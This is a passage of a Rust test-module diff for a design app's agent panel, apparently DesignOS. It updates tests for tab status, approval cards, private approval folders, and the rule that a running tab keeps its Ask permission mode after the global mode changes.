+            assert_eq!(st.tabs[0].effective_status(), AgentTabStatus::Error(Some("exit code 7".to_string())));
+            assert!(!crate::agent_stop::is_tab_turn_running(&st.tabs[0]));
+            kill_tabs(&mut st);
+        }
     }
 
     #[test]
@@ -9776,7 +11376,7 @@ mod tests {
         st.active_tab = tab_idx;
         let tab_id = st.tabs[tab_idx].id;
 
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(
             &events_path,
             concat!(
@@ -9848,7 +11448,7 @@ mod tests {
         st_denied.surface_visible = true;
         st_denied.status_msg = None;
 
-        let events_path = st_denied.session_dir.join("agent-events.jsonl");
+        let events_path = st_denied.prepared_hook_paths().events();
         std::fs::write(
             &events_path,
             concat!(
@@ -9881,7 +11481,7 @@ mod tests {
         st.window_focused = false;
         st.surface_visible = false;
 
-        let events_path2 = st.session_dir.join("agent-events.jsonl");
+        let events_path2 = st.prepared_hook_paths().events();
         std::fs::write(
             &events_path2,
             concat!(
@@ -9932,8 +11532,8 @@ mod tests {
             tab.title = "Claude CLI #1".into();
         }
 
-        let approvals_dir = crate::agent_permissions::approvals_dir(&st.session_dir);
-        std::fs::create_dir_all(&approvals_dir).unwrap();
+        let approvals_dir = st.active_tab().and_then(|tab| tab.approvals_dir.clone()).expect("a session tab has a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&approvals_dir).unwrap();
         let now = crate::agent_sessions::unix_timestamp_secs();
 
         // 1. Write a request and verify the approval card surfaces and clicking Approve writes "allow"
@@ -9957,7 +11557,7 @@ mod tests {
         let (texts, boxes) = crate::lint::scan_shapes(&out.shapes);
         assert!(crate::lint::check_text(&texts, &boxes).is_empty());
         let all_txt: Vec<&str> = texts.iter().map(|t| t.text.as_str()).collect();
-        assert!(all_txt.iter().any(|t| t.contains("Bash")), "Tool name 'Bash' must be painted: {all_txt:?}");
+        assert!(all_txt.contains(&"Run a command"), "The tool verb must be painted: {all_txt:?}");
         assert!(all_txt.iter().any(|t| t.contains("cargo test")), "Summary must be painted: {all_txt:?}");
         assert!(all_txt.contains(&"Approve"), "Approve button must be painted: {all_txt:?}");
         assert!(all_txt.contains(&"Deny"), "Deny button must be painted: {all_txt:?}");
@@ -10010,14 +11610,14 @@ mod tests {
     }
 
     #[test]
-    fn status_becomes_needs_approval() {
+    fn status_becomes_needs_approval_and_the_tab_carries_the_dot() {
         let ctx = egui::Context::default();
         crate::theme::install_fonts(&ctx);
         crate::theme::apply(&ctx);
 
         let mut st = ScopedTerminalState::default();
         st.bind_session(&format!("656-status-{}", std::process::id()));
-        st.open_approval_fixture("agents-approval-command", None);
+        st.open_approval_fixture("agents-approval-command", None, crate::agent_permissions::AgentPermissionMode::Ask);
         assert!(st.needs_approval());
         let tab_status = st.active_tab().unwrap().agent_status.lock().unwrap().clone();
         assert_eq!(tab_status, AgentTabStatus::WaitingForInput(Some("Needs approval".into())));
@@ -10029,9 +11629,12 @@ mod tests {
         let (texts, boxes) = crate::lint::scan_shapes(&out.shapes);
         assert!(crate::lint::check_text(&texts, &boxes).is_empty());
         let all_txt: Vec<&str> = texts.iter().map(|t| t.text.as_str()).collect();
-        assert!(all_txt.contains(&"Needs approval"), "Status pill 'Needs approval' must be painted: {all_txt:?}");
+        assert!(!all_txt.contains(&"Needs approval"), "the card says it, no second status pill is painted: {all_txt:?}");
         let pill_rect: Option<Rect> = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-needs-approval-pill".to_string()))));
-        assert!(pill_rect.is_some(), "agents-needs-approval-pill must be recorded");
+        assert!(pill_rect.is_none(), "the strip pill is gone");
+        let dot_key = format!("agents-tab-dot-{}", st.active_tab().unwrap().id);
+        let dot_rect: Option<Rect> = ctx.data(|d| d.get_temp(Id::new(("test-rect", dot_key.clone()))));
+        assert!(dot_rect.is_some(), "the tab carries the one status dot while it needs the user");
 
         let _ = std::fs::remove_dir_all(&st.session_dir);
         kill_tabs(&mut st);
@@ -10113,8 +11716,8 @@ mod tests {
             tab.preset = AgentCliPreset::Claude;
         }
 
-        let approvals_dir = crate::agent_permissions::approvals_dir(&st.session_dir);
-        std::fs::create_dir_all(&approvals_dir).unwrap();
+        let approvals_dir = st.active_tab().and_then(|tab| tab.approvals_dir.clone()).expect("a session tab has a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&approvals_dir).unwrap();
         let req = serde_json::json!({
             "id": "3001-Bash",
             "tool_name": "Bash",
@@ -10137,13 +11740,15 @@ mod tests {
 
     #[test]
     fn sim_approval_card_and_permissions_modal_pass_layout_lint() {
-        for preset_slug in ["agents-approval-command", "agents-approval-queued", "agents-approval-open-tab"] {
+        for preset_slug in
+            ["agents-approval-command", "agents-approval-queued", "agents-approval-open-tab", "agents-approval-background-tab", "agents-scrollback"]
+        {
             let ctx = egui::Context::default();
             crate::theme::install_fonts(&ctx);
             crate::theme::apply(&ctx);
             let mut st = ScopedTerminalState::default();
             st.bind_session(&format!("656-lint-{preset_slug}-{}", std::process::id()));
-            st.open_approval_fixture(preset_slug, None);
+            st.open_approval_fixture(preset_slug, None, crate::agent_permissions::AgentPermissionMode::Ask);
 
             crate::lint::take_icons();
             let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(300.0, 800.0));
@@ -10195,8 +11800,8 @@ mod tests {
                 tab.id
             })
             .expect("tab 1 exists");
-        let tab1_approvals_dir = crate::agent_permissions::tab_approvals_dir(&st.session_dir, tab1_id);
-        std::fs::create_dir_all(&tab1_approvals_dir).unwrap();
+        let tab1_approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&st.session_dir, tab1_id).expect("a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&tab1_approvals_dir).unwrap();
         let req_path = tab1_approvals_dir.join("4001-Bash.request.json");
         let req = serde_json::json!({
             "id": "4001-Bash",
@@ -10210,12 +11815,12 @@ mod tests {
         assert_eq!(st.pending_approvals.len(), 1);
 
         // Open a second tab, give it its own per-tab pending approval, and close Tab 2:
-        // Tab 2's request in approvals/tab-<tab2_id>/ must be withdrawn while Tab 1's request in approvals/tab-<tab1_id>/ survives.
+        // Tab 2's request in its own private tab folder must be withdrawn while Tab 1's request in its folder survives.
         let _ = st.spawn_tab(AgentCliPreset::Shell, None);
         assert_eq!(st.tabs.len(), 2);
         let tab2_id = st.tabs[1].id;
-        let tab2_approvals_dir = crate::agent_permissions::tab_approvals_dir(&st.session_dir, tab2_id);
-        std::fs::create_dir_all(&tab2_approvals_dir).unwrap();
+        let tab2_approvals_dir = crate::agent_approval_channel::tab_approvals_dir(&st.session_dir, tab2_id).expect("a private approvals folder");
+        crate::agent_approval_channel::create_private_dir_all(&tab2_approvals_dir).unwrap();
         let tab2_req_path = tab2_approvals_dir.join("4002-Bash.request.json");
         let tab2_ans_path = tab2_approvals_dir.join("4002-Bash.answer");
         let tab2_req = serde_json::json!({
@@ -10278,7 +11883,14 @@ mod tests {
         let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(300.0, 800.0));
         let mut card_act = None;
         let out = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-            card_act = crate::agent_approval_card::paint_approval_card(ui, panel_rect, AgentCliPreset::Claude, &[], "test-empty-claude");
+            card_act = crate::agent_approval_card::paint_approval_card(
+                ui,
+                panel_rect,
+                AgentCliPreset::Claude,
+                &[],
+                "test-empty-claude",
+                crate::agent_permissions::AgentPermissionMode::Ask,
+            );
         });
         assert!(card_act.is_none());
         let (texts, _) = crate::lint::scan_shapes(&out.shapes);
@@ -10352,7 +11964,7 @@ mod tests {
     fn a_late_stop_failure_does_not_overwrite_the_stopped_receipt() {
         let mut st = isolated_683_state(68462);
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-stop-failure"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":400.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-stop-failure\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
 
@@ -10378,7 +11990,7 @@ mod tests {
     fn a_user_stop_is_never_classified_as_a_session_failure() {
         let mut st = isolated_683_state(68631);
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-stop-no-failure"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":400.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-stop-no-failure\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
 
@@ -10405,7 +12017,7 @@ mod tests {
     fn a_stop_failure_event_sets_the_banner_and_the_next_prompt_clears_it() {
         let mut st = isolated_683_state(68632);
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-failure-banner"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":500.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-failure-banner\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
         let append = |line: &str| {
@@ -10435,7 +12047,7 @@ mod tests {
     fn tool_events_in_flight_after_a_stop_do_not_revive_the_tab_until_a_new_prompt() {
         let mut st = isolated_683_state(68461);
         let idx = spawn_mock_agent_tab(&mut st, AgentCliPreset::Claude, Some("sid-stopped"));
-        let events_path = st.session_dir.join("agent-events.jsonl");
+        let events_path = st.prepared_hook_paths().events();
         std::fs::write(&events_path, "{\"t\":400.0,\"e\":\"UserPromptSubmit\",\"p\":{\"session_id\":\"sid-stopped\"}}\n").unwrap();
         let _ = st.poll_live_agent_bridge();
         assert!(matches!(st.tabs[idx].effective_status(), AgentTabStatus::Working(_)));
@@ -10483,60 +12095,13 @@ mod tests {
             name: "Deleted/Layer".to_string(),
             page: Some("Landing".to_string()),
         });
-        st.submit_chat_prompt("Check @Hero/Title and @Hero/Title spacing", None);
+        st.send_from_composer_box("Check @Hero/Title and @Hero/Title spacing", None);
         let written = String::from_utf8_lossy(&st.active_tab().unwrap().written_bytes).into_owned();
         assert!(written.contains("References: @Hero/Title = designos:node/4521"), "the live session gets the reference footer: {written:?}");
         assert!(!written.contains("9999"), "deleted mention must not be included in sent prompt");
         let ref_count = written.lines().filter(|l| l.contains("References:")).count();
         assert_eq!(ref_count, 1, "duplicate @Hero/Title must be listed once");
         assert!(st.active_mentions.is_empty(), "a sent prompt consumes its mentions");
-
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&st.session_dir);
-    }
-
-    #[test]
-    fn mention_pick_in_shell_tab_sends_zero_bytes_keeps_popup_and_claude_tab_receives_reference() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let (doc, page, ids) = make_three_layer_doc();
-        let mut st = isolated_683_state(65503);
-        st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn shell tab");
-        let rec = attach_recorder(st.active_tab_mut().unwrap());
-        st.sync_live_file_context(&doc, page, &[], None);
-        st.mention_popup.toggle_terminal_mode_for("agents-left-pty", &doc, page);
-        assert!(st.mention_popup.is_open());
-
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(300.0, 600.0));
-        let enter_raw = || egui::RawInput {
-            screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0))),
-            events: vec![egui::Event::Key { key: Key::Enter, physical_key: None, pressed: true, repeat: false, modifiers: egui::Modifiers::NONE }],
-            ..Default::default()
-        };
-
-        // 1) Active tab is a Shell tab: Enter must write zero bytes, keep popup open, and set status.
-        let _ = ctx.run_ui(enter_raw(), |ui| {
-            crate::agent_selection_chip::with_selection_summary(&doc, page, &[], |summary| {
-                let _ = show_left_with_doc(&mut st, ui, panel_rect, None, summary, &doc, page);
-            });
-        });
-        assert!(rec.lock().unwrap().is_empty(), "Shell tab must receive zero bytes when picking a mention");
-        assert!(st.mention_popup.is_open(), "popup must stay open when no agent tab accepted the paste");
-        assert_eq!(st.status_msg.as_deref(), Some("Nothing sent. Open an agent tab first."));
-
-        // 2) Active tab is a live Claude tab: Enter pastes `@A (designos:node/<id>)` and closes popup.
-        st.active_tab_mut().unwrap().spawn_preset = AgentCliPreset::Claude;
-        let _ = ctx.run_ui(enter_raw(), |ui| {
-            crate::agent_selection_chip::with_selection_summary(&doc, page, &[], |summary| {
-                let _ = show_left_with_doc(&mut st, ui, panel_rect, None, summary, &doc, page);
-            });
-        });
-        assert!(!st.mention_popup.is_open(), "popup must close once live Claude tab accepts the paste");
-        let bytes = rec.lock().unwrap().clone();
-        let pasted = String::from_utf8_lossy(&bytes);
-        let expected_ref = format!("@A (designos:node/{})", ids[0].0);
-        assert!(pasted.contains(&expected_ref), "expected live Claude tab to receive {expected_ref}, got {pasted:?}");
 
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
@@ -10590,59 +12155,6 @@ mod tests {
         assert_eq!(st.composer_draft(), "make @A red");
         assert_eq!(st.active_mentions.len(), 1);
         assert_eq!(st.active_mentions[0].label, "A");
-
-        kill_tabs(&mut st);
-        let _ = std::fs::remove_dir_all(&st.session_dir);
-    }
-
-    #[test]
-    fn mention_popup_opens_inside_the_agents_panel_and_pastes_the_picked_layer() {
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let (doc, page, ids) = make_three_layer_doc();
-        let mut st = isolated_683_state(65505);
-        st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn tab");
-        st.active_tab_mut().unwrap().spawn_preset = AgentCliPreset::Claude;
-        let rec = attach_recorder(st.active_tab_mut().unwrap());
-        st.sync_live_file_context(&doc, page, &[], None);
-
-        let left_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(280.0, 600.0));
-        let screen = Rect::from_min_size(Pos2::ZERO, Vec2::new(1440.0, 900.0));
-        let paint = |ctx: &egui::Context, st: &mut TerminalState, raw: egui::RawInput| {
-            let _ = ctx.run_ui(raw, |ui| {
-                crate::agent_selection_chip::with_selection_summary(&doc, page, &[], |summary| {
-                    let _ = show_left_with_doc(st, ui, left_rect, None, summary, &doc, page);
-                });
-            });
-        };
-        let click_ev = |pos: Pos2| egui::RawInput {
-            screen_rect: Some(screen),
-            events: vec![
-                egui::Event::PointerMoved(pos),
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
-            ],
-            ..Default::default()
-        };
-
-        // Frame 1: paint the panel to record `agent-mention-btn-left`.
-        paint(&ctx, &mut st, egui::RawInput { screen_rect: Some(screen), ..Default::default() });
-        let mention_btn: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agent-mention-btn-left".to_string())))).expect("mention button rect");
-
-        // Frame 2: click `@ Mention`.
-        paint(&ctx, &mut st, click_ev(mention_btn.center()));
-        assert!(st.mention_popup.is_open(), "clicking @ Mention must open the popup");
-
-        // Frame 3: paint so the popup records `agent-mention-row-0` inside the panel, then click it.
-        paint(&ctx, &mut st, egui::RawInput { screen_rect: Some(screen), ..Default::default() });
-        let row0: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agent-mention-row-0".to_string())))).expect("row 0 rect");
-        assert!(left_rect.contains(row0.center()), "the popup must render inside the Agents panel, got {row0:?}");
-
-        paint(&ctx, &mut st, click_ev(row0.center()));
-        assert!(!st.mention_popup.is_open(), "clicking a row in the popup must pick and close");
-        let pasted = String::from_utf8_lossy(&rec.lock().unwrap()).to_string();
-        assert!(pasted.contains(&format!("@A (designos:node/{})", ids[0].0)), "a row click must paste the mention into the Claude tab, got {pasted:?}");
 
         kill_tabs(&mut st);
         let _ = std::fs::remove_dir_all(&st.session_dir);
@@ -10817,339 +12329,343 @@ mod tests {
     }
 
     #[test]
-    fn the_three_contexts_show_their_prompts() {
-        use crate::agent_sample_prompts::{sample_prompts, PromptContext};
-        use designos_doc::{FrameProps, Node, NodeKind};
-
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-
-        let mut doc = Document::new("688 Three Contexts");
-        let page = doc.add_page("Page 1");
-        let mut st = isolated_683_state(68801);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-
-        // 1. EmptyFile context
-        st.sync_live_file_context(&doc, page, &[], None);
-        assert_eq!(st.prompt_context, PromptContext::EmptyFile);
-        let out_empty =
-            ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-                let _ = show_left(&mut st, ui, panel_rect, None);
-            });
-        let (texts_empty, _) = crate::lint::scan_shapes(&out_empty.shapes);
-        for (idx, expected) in sample_prompts(PromptContext::EmptyFile).iter().enumerate() {
-            assert!(
-                ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", format!("agents-sample-prompt-{idx}"))))).is_some(),
-                "EmptyFile prompt row {idx} must be recorded"
-            );
-            assert!(texts_empty.iter().any(|t| t.text == expected.label), "EmptyFile prompt label {:?} must be painted: {:?}", expected.label, texts_empty);
+    fn switching_global_permission_mode_leaves_existing_project_tabs_in_their_mode() {
+        use crate::agent_permissions::AgentPermissionMode;
+        let mut app = crate::app::App::new(designos_doc::Document::new("Tab 1"));
+        app.terminal.permission_mode = AgentPermissionMode::Ask;
+        let mut tabs = std::mem::take(&mut app.tabs);
+        tabs.open_new_design_tab(&mut app);
+        app.tabs = tabs;
+        assert_eq!(app.tabs.entries[0].terminal.permission_mode, AgentPermissionMode::Ask);
+        app.set_agent_permission_mode(AgentPermissionMode::Skip);
+        assert_eq!(app.terminal.permission_mode, AgentPermissionMode::Skip);
+        assert_eq!(
+            app.tabs.entries[0].terminal.permission_mode,
+            AgentPermissionMode::Ask,
+            "an existing project tab keeps the permission mode it was running in when another tab changes the global setting"
+        );
+        app.terminal.shutdown();
+        for entry in &mut app.tabs.entries {
+            entry.terminal.shutdown();
         }
-
-        // 2. Frame context (when a frame is selected)
-        let frame_id = doc.alloc_id();
-        let mut frame_node = Node::new(frame_id, NodeKind::Frame(FrameProps::default()));
-        frame_node.name = "Card".into();
-        let frame_id = doc.insert(page, frame_node).expect("insert frame");
-        st.sync_live_file_context(&doc, page, &[frame_id], None);
-        assert_eq!(st.prompt_context, PromptContext::Frame);
-        let out_frame =
-            ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-                let _ = show_left(&mut st, ui, panel_rect, None);
-            });
-        let (texts_frame, _) = crate::lint::scan_shapes(&out_frame.shapes);
-        for (idx, expected) in sample_prompts(PromptContext::Frame).iter().enumerate() {
-            assert!(
-                ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", format!("agents-sample-prompt-{idx}"))))).is_some(),
-                "Frame prompt row {idx} must be recorded"
-            );
-            assert!(texts_frame.iter().any(|t| t.text == expected.label), "Frame prompt label {:?} must be painted: {:?}", expected.label, texts_frame);
-        }
-
-        // 3. NoSelection context (non-empty file, empty selection)
-        st.sync_live_file_context(&doc, page, &[], None);
-        assert_eq!(st.prompt_context, PromptContext::NoSelection);
-        let out_nosel =
-            ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-                let _ = show_left(&mut st, ui, panel_rect, None);
-            });
-        let (texts_nosel, _) = crate::lint::scan_shapes(&out_nosel.shapes);
-        for (idx, expected) in sample_prompts(PromptContext::NoSelection).iter().enumerate() {
-            assert!(
-                ctx.data(|d| d.get_temp::<Rect>(Id::new(("test-rect", format!("agents-sample-prompt-{idx}"))))).is_some(),
-                "NoSelection prompt row {idx} must be recorded"
-            );
-            assert!(texts_nosel.iter().any(|t| t.text == expected.label), "NoSelection prompt label {:?} must be painted: {:?}", expected.label, texts_nosel);
-        }
-        kill_tabs(&mut st);
     }
 
-    #[test]
-    fn a_click_fills_the_composer_and_changes_nothing_else() {
-        use crate::agent_sample_prompts::{sample_prompts, PromptContext};
-
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
-
-        let mut doc = Document::new("688 Click Fills Composer");
-        let page = doc.add_page("Page 1");
-        let doc_hash = |d: &Document| -> u64 {
-            use std::hash::{Hash, Hasher};
-            let mut h = std::collections::hash_map::DefaultHasher::new();
-            d.to_json().expect("doc.to_json").hash(&mut h);
-            h.finish()
-        };
-        let hash_before = doc_hash(&doc);
-
-        let mut st = isolated_683_state(68802);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.spawn_tab(AgentCliPreset::Shell, None).expect("spawn shell tab");
-        let rec = attach_recorder(st.active_tab_mut().expect("active tab"));
-        st.sync_live_file_context(&doc, page, &[], None);
-        assert_eq!(st.prompt_context, PromptContext::EmptyFile);
-
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let row0: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-sample-prompt-0".to_string())))).expect("agents-sample-prompt-0 recorded");
-        let pos = row0.center();
-
-        let mut actions = Vec::new();
-        let raw = egui::RawInput {
-            screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))),
-            events: vec![
-                egui::Event::PointerMoved(pos),
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
-                egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
-            ],
-            ..Default::default()
-        };
-        let _ = ctx.run_ui(raw, |ui| {
-            actions = show_left(&mut st, ui, panel_rect, None);
-        });
-
-        let expected_text = &sample_prompts(PromptContext::EmptyFile)[0].text;
-        assert_eq!(st.composer_draft(), expected_text.as_str(), "clicking sample prompt must set the composer draft to the full prompt text");
-        assert!(st.active_tab().unwrap().written_bytes.is_empty(), "clicking sample prompt must never write to the new session's PTY");
-        assert!(actions.is_empty(), "clicking sample prompt must emit no TerminalAction: {actions:?}");
-        assert_eq!(doc_hash(&doc), hash_before, "document hash must be unchanged");
-        assert!(rec.lock().unwrap().is_empty(), "PTY must receive 0 bytes when clicking a sample prompt");
-        assert!(ctx.memory(|m| m.has_focus(Id::new("agents-ask-for-changes-input"))), "clicking sample prompt must focus the composer input");
-        kill_tabs(&mut st);
+    #[cfg(unix)]
+    fn write_idle_stub_clis(bin_dir: &Path) {
+        use std::os::unix::fs::PermissionsExt;
+        std::fs::create_dir_all(bin_dir).expect("create stub bin dir");
+        for name in ["claude", "codex"] {
+            let path = bin_dir.join(name);
+            std::fs::write(&path, "#!/bin/sh\nsleep 30\n").expect("write stub cli");
+            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).expect("chmod stub cli");
+        }
     }
 
+    #[cfg(unix)]
+    fn spawn_tab_approval_hook(script: &Path, tab_id: usize, payload: &str) -> std::process::Child {
+        use std::io::Write;
+        use std::process::{Command, Stdio};
+        let mut child = Command::new("/bin/sh")
+            .arg(script)
+            .env("DESIGNOS_TAB_ID", tab_id.to_string())
+            .env("DESIGNOS_APPROVAL_TIMEOUT_MS", "2500")
+            .stdin(Stdio::piped())
+            .stdout(Stdio::piped())
+            .stderr(Stdio::piped())
+            .spawn()
+            .expect("spawn approval hook");
+        if let Some(mut stdin) = child.stdin.take() {
+            let _ = stdin.write_all(payload.as_bytes());
+        }
+        child
+    }
+
+    #[cfg(unix)]
     #[test]
-    fn a_click_appends_to_an_existing_draft() {
-        use crate::agent_sample_prompts::{sample_prompts, PromptContext};
+    fn running_tab_keeps_asking_after_global_mode_switch_canvas_snapshot_and_new_tab() {
+        use crate::agent_permissions::{save_permission_mode, AgentPermissionMode, ApprovalDecision};
+        const SAFE_READ_PAYLOAD: &str = r#"{"tool_name":"mcp__designos__designos_get_document","tool_input":{}}"#;
 
-        let ctx = egui::Context::default();
-        crate::theme::install_fonts(&ctx);
-        crate::theme::apply(&ctx);
-        let panel_rect = Rect::from_min_size(Pos2::new(48.0, 0.0), Vec2::new(320.0, 800.0));
+        for (case_idx, later_mode) in [AgentPermissionMode::AskRisky, AgentPermissionMode::Skip].into_iter().enumerate() {
+            let root = permission_window_root(&format!("running-tab-keeps-ask-{case_idx}"));
+            let bin_dir = root.join("bin");
+            write_idle_stub_clis(&bin_dir);
+            save_permission_mode(&root, AgentPermissionMode::Ask).expect("save Ask");
 
-        let mut st = isolated_683_state(68803);
-        st.side_panel_pty_open = false;
-        st.chat_mode = true;
-        st.prompt_context = PromptContext::Frame;
-        st.set_composer_draft("Keep the header intact.");
+            let mut app = crate::app::App::new(designos_doc::Document::new("Running Tab Ask"));
+            app.lib = Some(designos_library::Library::open(&root).expect("open library"));
+            app.terminal.bind_library_file(&root, &format!("file-keep-ask-{case_idx}"), &format!("win-keep-ask-{case_idx}"));
+            app.terminal.path_override = Some(bin_dir.clone().into_os_string());
+            app.terminal.path_prepend = vec![bin_dir.clone()];
+            app.set_agent_permission_mode(AgentPermissionMode::Ask);
 
-        let _ = ctx.run_ui(egui::RawInput { screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))), ..Default::default() }, |ui| {
-            let _ = show_left(&mut st, ui, panel_rect, None);
-        });
-        let row1: Rect = ctx.data(|d| d.get_temp(Id::new(("test-rect", "agents-sample-prompt-1".to_string())))).expect("agents-sample-prompt-1 recorded");
-        let pos = row1.center();
+            let first_idx = app.terminal.spawn_tab(AgentCliPreset::Claude, None).expect("spawn first Ask tab");
+            let first_tab_id = app.terminal.tabs[first_idx].id;
+            assert_eq!(app.terminal.tabs[first_idx].permission_mode, AgentPermissionMode::Ask);
 
-        for click_round in 1..=2 {
-            let raw = egui::RawInput {
-                screen_rect: Some(Rect::from_min_size(Pos2::ZERO, Vec2::new(1600.0, 900.0))),
-                events: vec![
-                    egui::Event::PointerMoved(pos),
-                    egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: true, modifiers: egui::Modifiers::NONE },
-                    egui::Event::PointerButton { pos, button: egui::PointerButton::Primary, pressed: false, modifiers: egui::Modifiers::NONE },
-                ],
-                ..Default::default()
-            };
-            let _ = ctx.run_ui(raw, |ui| {
-                let _ = show_left(&mut st, ui, panel_rect, None);
-            });
-            let p_text = &sample_prompts(PromptContext::Frame)[1].text;
-            if click_round == 1 {
-                assert_eq!(st.composer_draft(), format!("Keep the header intact. {p_text}"));
-            } else {
-                assert_eq!(st.composer_draft(), format!("Keep the header intact. {p_text} {p_text}"));
+            let private_hooks = crate::agent_approval_channel::hooks_file_path(&app.terminal.session_dir).expect("private hooks path");
+            let script_path = crate::agent_approval_channel::hook_script_path(&app.terminal.session_dir).expect("private hook script path");
+            assert!(private_hooks.is_file(), "Ask tab provisions private hooks.json");
+            assert!(script_path.is_file(), "Ask tab provisions approve-hook.sh");
+            if later_mode == AgentPermissionMode::Skip {
+                std::fs::remove_file(&private_hooks).expect("clear initial hooks.json so canvas snapshot must rewrite it");
             }
+
+            app.set_agent_permission_mode(later_mode);
+            let page = app.doc.pages.first().copied().unwrap_or(designos_doc::NodeId(1));
+            app.doc.name = format!("Snapshot After Switch {case_idx}");
+            app.terminal.sync_live_file_context(&app.doc, page, &[], None);
+            app.terminal.flush_live_sync();
+
+            let second_idx = app.terminal.spawn_tab(AgentCliPreset::Claude, None).expect("spawn second tab in new global mode");
+            assert_eq!(app.terminal.tabs[first_idx].permission_mode, AgentPermissionMode::Ask, "running tab keeps Ask mode");
+            assert_eq!(app.terminal.tabs[second_idx].permission_mode, later_mode, "new tab takes the newly selected global mode");
+
+            app.doc.name = format!("Snapshot After Second Tab {case_idx}");
+            app.terminal.sync_live_file_context(&app.doc, page, &[], None);
+            app.terminal.flush_live_sync();
+
+            assert!(private_hooks.is_file(), "{later_mode:?}: canvas snapshot while an Ask tab is running must keep writing the private Ask hooks");
+
+            let hook_child = spawn_tab_approval_hook(&script_path, first_tab_id, SAFE_READ_PAYLOAD);
+            let asked = crate::test_timing::poll_until(std::time::Duration::from_millis(1200), || {
+                let _ = app.terminal.poll_live_agent_bridge();
+                !app.terminal.tabs[first_idx].pending_approvals.is_empty()
+            });
+            assert!(asked, "{later_mode:?}: first tab started in Ask must still raise an in-panel approval request instead of auto-allowing");
+            let req_id = app.terminal.tabs[first_idx].pending_approvals[0].id.clone();
+            app.terminal.focus_tab_by_id(first_tab_id);
+            app.terminal.answer_pending_approval(&req_id, ApprovalDecision::Allow);
+            let out = hook_child.wait_with_output().expect("wait for approval hook");
+            let stdout = String::from_utf8_lossy(&out.stdout);
+            assert!(stdout.contains("\"behavior\":\"allow\""), "{later_mode:?}: answering Allow lets the first tab proceed: {stdout}");
+
+            kill_tabs(&mut app.terminal);
+            app.terminal.shutdown();
+            let _ = std::fs::remove_dir_all(&root);
         }
-        kill_tabs(&mut st);
+    }
+
+    #[cfg(unix)]
+    #[test]
